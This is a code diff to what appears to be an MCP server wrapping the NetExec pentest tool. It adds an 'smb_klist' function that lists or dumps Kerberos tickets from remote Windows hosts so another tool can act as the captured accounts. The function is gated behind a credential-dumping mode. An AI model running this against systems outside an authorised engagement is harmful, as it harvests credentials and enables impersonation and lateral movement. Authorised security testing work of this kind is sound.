@@ -6,7 +6,7 @@ guardrails and the audit log apply uniformly. The surface spans:
   * **Read-only enumeration** (``offensive=False``) -- host fingerprint/auth check,
     shares, users, groups, sessions, password policy, rid-brute, file spidering.
   * **Offensive actions** (``offensive=True``, only run under ``NXC_MODE=full``) --
-    password spraying, credential dumping (sam/lsa/ntds/dpapi), remote command
+    password spraying, credential dumping (sam/lsa/ntds/dpapi/klist), remote command
     execution, and file get/put.
 
 The tools share the credential parameters defined in :mod:`auth`; pass them to
@@ -16,13 +16,16 @@ authenticate, or omit them for a null/guest session where the target allows it.
 from __future__ import annotations
 
 import os
+import time
 
 from ..auth import build_auth_flags
-from ..config import download_target, output_dir, written_file
+from ..config import download_target, klist_ccaches, output_dir, written_file
 from ..executor import execute
 from ..results import (
     parse_dir,
     parse_hosts_file,
+    parse_klist_dumps,
+    parse_klist_sessions,
     parse_lsa_secrets,
     parse_pass_pol,
     parse_reauth_swap,
@@ -707,6 +710,56 @@ def register(mcp, get_config) -> None:
             ntlm_hash=ntlm_hash, domain=domain, local_auth=local_auth,
             kerberos=kerberos, use_kcache=use_kcache, cred_id=cred_id, laps=laps, kdc_host=kdc_host, aes_key=aes_key, ccache=ccache, pfx_cert=pfx_cert, pfx_base64=pfx_base64, pfx_pass=pfx_pass, pem_cert=pem_cert, pem_key=pem_key,
         )
+
+    @mcp.tool()
+    async def smb_klist(
+        targets: list[str],
+        username: str | None = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
+        domain: str | None = None,
+        local_auth: bool = False,
+        kerberos: bool = False,
+        use_kcache: bool = False,
+        cred_id: int | None = None,
+        laps: str | None = None,
+        kdc_host: str | None = None,
+        aes_key: str | None = None,
+        ccache: str | None = None,
+        pfx_cert: str | None = None,
+        pfx_base64: str | None = None,
+        pfx_pass: str | None = None,
+        pem_cert: str | None = None,
+        pem_key: str | None = None,
+        dump: bool = False,
+        sessions: list[int] | None = None,
+    ) -> dict:
+        """List the Kerberos tickets (TGTs) cached on the target (`--klist`), or dump them as ccache files (`--klist-dump`). Requires admin.
+
+        Without `dump`, returns `sessions` (`{host, index, account, logon_id, expires}`).
+        `dump=true` saves each TGT as a ccache file on the nxc host and returns `tickets`
+        (`{host, principal, logon_id, ccache}`): pass a `ccache` path as the `ccache`
+        parameter of another tool to act as that account. `sessions` takes `index`
+        numbers from a listing to dump only those, and implies `dump`.
+
+        Runs `klist` on the target through an exec method. CREDENTIAL-DUMPING (NXC_MODE=loot
+        or full): read-only, but harvests credential material.
+        """
+        if sessions and any(n < 1 for n in sessions):
+            raise ValueError("sessions are the 1-based index numbers of a klist listing")
+        dump = dump or bool(sessions)
+        flags = ["--klist-dump", *map(str, sessions or [])] if dump else ["--klist"]
+        since = time.time()
+        result = await _loot_run(
+            get_config, flags, targets, username=username, password=password,
+            ntlm_hash=ntlm_hash, domain=domain, local_auth=local_auth,
+            kerberos=kerberos, use_kcache=use_kcache, cred_id=cred_id, laps=laps, kdc_host=kdc_host, aes_key=aes_key, ccache=ccache, pfx_cert=pfx_cert, pfx_base64=pfx_base64, pfx_pass=pfx_pass, pem_cert=pem_cert, pem_key=pem_key,
+        )
+        if dump:
+            result["tickets"] = klist_ccaches(parse_klist_dumps(result["stdout"]), since)
+        else:
+            result["sessions"] = parse_klist_sessions(result["stdout"])
+        return result
 
     # ---- Remote command execution (offensive=True; NXC_MODE=full only) ---- #
 
